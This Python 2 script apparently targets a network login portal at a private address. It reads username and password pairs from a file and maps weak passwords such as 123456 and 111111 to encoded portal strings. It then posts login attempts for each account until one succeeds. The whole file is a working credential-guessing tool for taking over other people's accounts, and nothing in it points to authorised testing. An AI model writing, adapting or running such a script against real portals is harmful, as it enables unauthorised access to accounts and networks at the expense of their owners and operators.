import pycurl
import StringIO
import urllib

map_list = {
    '111111':'965eb72c92a549dd',
    '123456':'49ba59abbe56e057',
    '000000':'8ad9902aecba32e2',
    '666666':'c831b04de153469d'
}
b = StringIO.StringIO()
c = pycurl.Curl()
host_address = '10.0.0.55'
file_obj = open("psw_list", 'r')
account_list = []
usingAccount = ""
flag = 0

def reset():
    b.truncate(0)
    c.reset()
    c.setopt(pycurl.WRITEFUNCTION, b.write)

def login(host, username, password):
    reset()
    c.setopt(pycurl.URL, 'http://%s/cgi-bin/do_login' % host)
    c.setopt(pycurl.POST, True)
    c.setopt(pycurl.POSTFIELDS, urllib.urlencode({
        'username': username,
        'password': password,
        'n': '100',
        'type': '1',
        'drop': '0',
    }))
    c.perform()
    return b.getvalue()

def logout(host, uid):
    reset()
    c.setopt(pycurl.URL, 'http://%s/cgi-bin/do_logout' % host)
    c.setopt(pycurl.POST, True)
    c.setopt(pycurl.POSTFIELDS, urllib.urlencode({
        'uid': uid,
    }))
    c.perform()
    return b.getvalue()

while 1:
    line = file_obj.readline()
    if not line:
        break
    account_list.append(line)
file_obj.close()
for line in account_list:
    username = line.split('&')[0]
    password = line.split('&')[1]
    password = map_list[password[0:6]]
    response = login(host_address, username, password)
    if response.isdigit():
        flag = 1
        break
if flag == 1:
    print "Login succeeded!"
else:
    print "Login failed!"
